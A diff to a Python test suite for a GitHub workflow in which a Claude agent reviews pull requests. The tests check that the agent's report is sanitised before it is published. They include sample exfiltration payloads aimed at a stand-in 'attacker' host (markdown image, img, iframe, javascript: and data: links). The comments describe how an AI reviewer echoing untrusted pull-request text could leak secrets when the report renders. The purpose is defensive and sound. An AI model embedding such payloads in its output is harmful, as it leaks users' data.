@@ -86,6 +86,7 @@ _PROMPT_KEYWORDS = frozenset({"false", "null", "true"})
 _MAX_STATIC_PROMPT_BYTES = 4096
 CHUNKER = ROOT / ".github" / "review-context" / "chunk_diff.py"
 BASE_COLLECTOR = ROOT / ".github" / "review-context" / "build_review_context.py"
+PUBLISHER = ROOT / ".github" / "review-context" / "publish_report.py"
 
 
 def _load_script(path: pathlib.Path) -> Any:
@@ -422,11 +423,17 @@ class ClaudeActionsWorkflowTests(unittest.TestCase):
         self.assertLessEqual(len(prompt.encode("utf-8")), _MAX_STATIC_PROMPT_BYTES)
 
     def test_mention_job_replaces_the_tag_mode_tracking_comment(self) -> None:
-        # Agent mode sets claudeCommentId to undefined, so results need an
-        # explicit delivery path rather than the tag-mode tracking comment.
+        # Agent mode sets claudeCommentId to undefined, so results need an explicit
+        # delivery path rather than the tag-mode tracking comment. That path is the
+        # repository's own publishing step, not the action's report: this test used to
+        # require display_report to be true, which is the setting the action documents
+        # as safe only for trusted input.
         workflow = load_yaml(MENTION_WORKFLOW)
-        claude = _claude_step(workflow)
-        self.assertEqual("true", str(claude["with"].get("display_report")).lower())
+        self.assertEqual(
+            "false", str(_claude_step(workflow)["with"]["display_report"]).lower()
+        )
+        publish = _named_step(workflow, "Publish the review report")
+        self.assertIn("GITHUB_STEP_SUMMARY", str(publish["run"]))
 
     def test_mention_checkout_binds_the_reviewed_pull_request_head(self) -> None:
         # Agent mode does no PR resolution of its own. On a comment event the
@@ -1156,9 +1163,12 @@ class ClaudeActionsWorkflowTests(unittest.TestCase):
             for item in guardrails["guardrails"]
             if item["id"] == "immutable-provider-ci-adapters"
         )
-        self.assertIn(
-            ".github/review-context/build_review_context.py", entry["implementation"]
-        )
+        for owned in (
+            ".github/review-context/build_review_context.py",
+            ".github/review-context/publish_report.py",
+        ):
+            with self.subTest(owned=owned):
+                self.assertIn(owned, entry["implementation"])
 
     def test_a_refused_diff_does_not_fail_the_step(self) -> None:
         # The step runs under `set -eu`, and the provider can refuse the diff of a very
@@ -1373,6 +1383,119 @@ class ClaudeActionsWorkflowTests(unittest.TestCase):
         prompt = " ".join(_claude_step(workflow)["with"]["prompt"].split())
         self.assertIn("no-patch.txt", prompt)
         self.assertIn("not examined", prompt)
+
+    def test_the_action_does_not_render_the_report_itself(self) -> None:
+        # The action's own input documents that display_report "should only be used in
+        # cases where the action is used solely with trusted input". A candidate Pull
+        # Request is untrusted by definition, and a step summary renders Markdown
+        # including images, so the report is published by the repository instead.
+        workflow = load_yaml(MENTION_WORKFLOW)
+        claude = _claude_step(workflow)
+        self.assertEqual("false", str(claude["with"]["display_report"]).lower())
+        self.assertEqual(
+            "false", str(claude["with"].get("show_full_output", "false")).lower()
+        )
+        publish = _named_step(workflow, "Publish the review report")
+        self.assertIn("publish_report.py", str(publish["run"]))
+        self.assertIn("GITHUB_STEP_SUMMARY", str(publish["run"]))
+        # A failed reviewer must still report, rather than fail silently.
+        self.assertIn("always()", str(publish["if"]))
+
+    def test_the_session_is_bounded_in_turns(self) -> None:
+        args = " ".join(
+            str(
+                _claude_step(load_yaml(MENTION_WORKFLOW))["with"]["claude_args"]
+            ).split()
+        )
+        self.assertRegex(args, r"--max-turns \d+")
+
+    def test_the_report_carries_no_render_time_fetch(self) -> None:
+        # The hazard is passive: a step summary renders Markdown, so an image URL in a
+        # report that echoes attacker-supplied text is fetched with no click. This is
+        # the one channel the rest of Decision 0094 does not touch, because every other
+        # control governs what the reviewer reads rather than what it publishes.
+        publisher = _load_script(PUBLISHER)
+        vectors = [
+            "![](https://attacker/?q=secret)",
+            "![alt][ref]",
+            "<img src=https://attacker/x>",
+            "<iframe src=https://attacker/></iframe>",
+            "[click](javascript:alert(1))",
+            "[d](data:text/html;base64,AAA)",
+            "normal **text** and [a link](https://ok/)",
+        ]
+        raw = "\n".join(vectors)
+        cleaned = publisher.neutralise(raw)
+
+        def vectors_in(text: str) -> set[str]:
+            found = set()
+            for line in text.splitlines():
+                if re.search(r"(?<!\\)!\[", line):
+                    found.add("image")
+                if "<" in line or ">" in line:
+                    found.add("html")
+                if re.search(r"(?i)(javascript|data|vbscript):", line):
+                    found.add("scheme")
+            return found
+
+        # Control first: the checks must fire on the raw input, or they prove nothing.
+        self.assertEqual({"image", "html", "scheme"}, vectors_in(raw))
+        self.assertEqual(set(), vectors_in(cleaned))
+        # Ordinary review prose must survive, or the sanitiser is useless.
+        self.assertIn("**text**", cleaned)
+        self.assertIn("[a link](https://ok/)", cleaned)
+
+    def test_fenced_code_is_left_readable(self) -> None:
+        # Nothing inside a fence renders, and a report about code is unreadable if its
+        # code is escaped.
+        publisher = _load_script(PUBLISHER)
+        body = (
+            "before\n```python\nx = a < b and c > d  # ![](https://x/)\n```\nafter <b>"
+        )
+        cleaned = publisher.neutralise(body)
+        self.assertIn("x = a < b and c > d  # ![](https://x/)", cleaned)
+        self.assertIn("after &lt;b&gt;", cleaned)
+
+    def test_the_report_is_extracted_and_bounded(self) -> None:
+        publisher = _load_script(PUBLISHER)
+        with tempfile.TemporaryDirectory() as scratch:
+            path = pathlib.Path(scratch) / "execution.json"
+            path.write_text(
+                json.dumps(
+                    [
+                        {
+                            "type": "assistant",
+                            "message": {"content": [{"text": "early"}]},
+                        },
+                        {
+                            "type": "result",
+                            "result": "F" * (publisher._MAX_BYTES + 500),
+                        },
+                    ]
+                ),
+                encoding="utf-8",
+            )
+            rendered = publisher.render(path)
+            self.assertIn("truncated", rendered)
+            self.assertLess(len(rendered.encode("utf-8")), publisher._MAX_BYTES + 2048)
+
+            # With no result turn, the last assistant text is used instead.
+            path.write_text(
+                json.dumps(
+                    [
+                        {
+                            "type": "assistant",
+                            "message": {"content": [{"text": "only this"}]},
+                        }
+                    ]
+                ),
+                encoding="utf-8",
+            )
+            self.assertIn("only this", publisher.render(path))
+
+            # A malformed file reports that, rather than publishing nothing.
+            path.write_text("not json", encoding="utf-8")
+            self.assertIn("unavailable", publisher.render(path))
 
     def test_deny_rules_cover_every_granted_filesystem_tool(self) -> None:
         # A Read deny rule does not constrain Grep: ripgrep would return matching
